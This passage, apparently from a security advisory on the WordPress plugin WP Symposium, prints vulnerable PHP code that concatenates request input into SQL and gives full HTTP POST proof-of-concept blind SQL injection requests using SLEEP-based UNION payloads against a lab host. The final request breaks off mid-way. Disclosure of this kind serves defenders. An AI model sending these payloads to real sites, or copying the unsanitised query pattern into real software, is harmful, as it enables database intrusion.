id="crayon-53c98785eff06249362923-1666"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1667"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1668"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1669">&nbsp;</div><div class="crayon-line" id="crayon-53c98785eff06249362923-1670"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1671"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT topic_category FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">'symposium_topics'</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE tid = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1672"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1673">&nbsp;</div><div class="crayon-line" id="crayon-53c98785eff06249362923-1674"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_topics SET topic_category = "</span><span class="crayon-sy">.</span><span class="crayon-v">$topic_category</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE topic_parent = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1675">&nbsp;</div><div class="crayon-line" id="crayon-53c98785eff06249362923-1676"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_topics SET topic_subject = %s, topic_post = %s, topic_category = %d WHERE tid = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1677"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_category</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1678">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1679"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$parent</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT topic_parent FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">'symposium_topics'</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE tid = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1680">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1681"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1682">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1683"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1684"><span class="crayon-sy">}</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0160 seconds] -->
+<p>We can exploit it like this with an appropriate set of cookies:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98785eff17132235459" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_forum_functions.php HTTP/1.0
+Host: 192.168.80.130
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
+Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+
+action=updateEditDetails&amp;tid=1 UNION SELECT SLEEP(10)</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98785eff17132235459-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff17132235459-2">2</div><div class="crayon-num" data-line="crayon-53c98785eff17132235459-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff17132235459-4">4</div><div class="crayon-num" data-line="crayon-53c98785eff17132235459-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff17132235459-6">6</div><div class="crayon-num" data-line="crayon-53c98785eff17132235459-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff17132235459-8">8</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98785eff17132235459-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_forum_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff17132235459-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98785eff17132235459-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff17132235459-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98785eff17132235459-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff17132235459-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">53</span></div><div class="crayon-line" id="crayon-53c98785eff17132235459-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff17132235459-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">updateEditDetails</span><span class="crayon-o">&amp;</span><span class="crayon-v">tid</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-e">SLEEP</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0041 seconds] -->
+<p><strong> Analysis of profile addFriend blind SQL injection vulnerability</strong></p>
+<p>A similar lack of input validation can be seen in the /ajax/symposium_profile_functions.php file in the addFriend action handling code. It takes in an ID for a friend to add and then starts putting together some SQL like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98785eff26614101977" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+// Friend request made
+if ($_POST['action'] == 'addFriend') {
+
+	global $wpdb, $current_user;
+
+	if (is_user_logged_in()) {
+
+		$friend_from = $current_user-&gt;ID;
+		$friend_to = $_POST['friend_to'];;					
+		$friend_message = $_POST['friend_message'];
+
+		// check that request isn't already there
+		if ( $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT * FROM ".$wpdb-&gt;base_prefix."symposium_friends WHERE (friend_from = ".$friend_to." AND friend_to = ".$current_user-&gt;ID." OR friend_to = ".$friend_to." AND friend_from = ".$current_user-&gt;ID.")")) ) {
+			// already exists
+		} else {</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98785eff26614101977-1547">1547</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff26614101977-1548">1548</div><div class="crayon-num" data-line="crayon-53c98785eff26614101977-1549">1549</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff26614101977-1550">1550</div><div class="crayon-num" data-line="crayon-53c98785eff26614101977-1551">1551</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff26614101977-1552">1552</div><div class="crayon-num" data-line="crayon-53c98785eff26614101977-1553">1553</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff26614101977-1554">1554</div><div class="crayon-num" data-line="crayon-53c98785eff26614101977-1555">1555</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff26614101977-1556">1556</div><div class="crayon-num" data-line="crayon-53c98785eff26614101977-1557">1557</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff26614101977-1558">1558</div><div class="crayon-num" data-line="crayon-53c98785eff26614101977-1559">1559</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff26614101977-1560">1560</div><div class="crayon-num" data-line="crayon-53c98785eff26614101977-1561">1561</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98785eff26614101977-1547"><span class="crayon-c">// Friend request made</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff26614101977-1548"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'addFriend'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98785eff26614101977-1549">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff26614101977-1550"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785eff26614101977-1551">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff26614101977-1552"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98785eff26614101977-1553">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff26614101977-1554"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_from</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785eff26614101977-1555"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_to</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'friend_to'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff26614101977-1556"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_message</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'friend_message'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785eff26614101977-1557">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff26614101977-1558"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// check that request isn't already there</span></div><div class="crayon-line" id="crayon-53c98785eff26614101977-1559"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_friends WHERE (friend_from = "</span><span class="crayon-sy">.</span><span class="crayon-v">$friend_to</span><span class="crayon-sy">.</span><span class="crayon-s">" AND friend_to = "</span><span class="crayon-sy">.</span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">" OR friend_to = "</span><span class="crayon-sy">.</span><span class="crayon-v">$friend_to</span><span class="crayon-sy">.</span><span class="crayon-s">" AND friend_from = "</span><span class="crayon-sy">.</span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">")"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff26614101977-1560"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// already exists</span></div><div class="crayon-line" id="crayon-53c98785eff26614101977-1561"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0056 seconds] -->
+<p>Notice that it simply concatenates the $friend_to variable into the query. While this query is not used for output, we can still do a blind SQL injection if we&#8217;re logged in.</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98785eff35236535183" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_profile_functions.php HTTP/1.0
+Host: 192.168.80.130
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
+Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+
+action=addFriend&amp;friend_to=1 AND 1=2) UNION SELECT SLEEP(10), 2, 3, 4, 5, 6; --</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98785eff35236535183-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff35236535183-2">2</div><div class="crayon-num" data-line="crayon-53c98785eff35236535183-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff35236535183-4">4</div><div class="crayon-num" data-line="crayon-53c98785eff35236535183-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff35236535183-6">6</div><div class="crayon-num" data-line="crayon-53c98785eff35236535183-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff35236535183-8">8</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98785eff35236535183-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_profile_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff35236535183-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98785eff35236535183-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff35236535183-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" 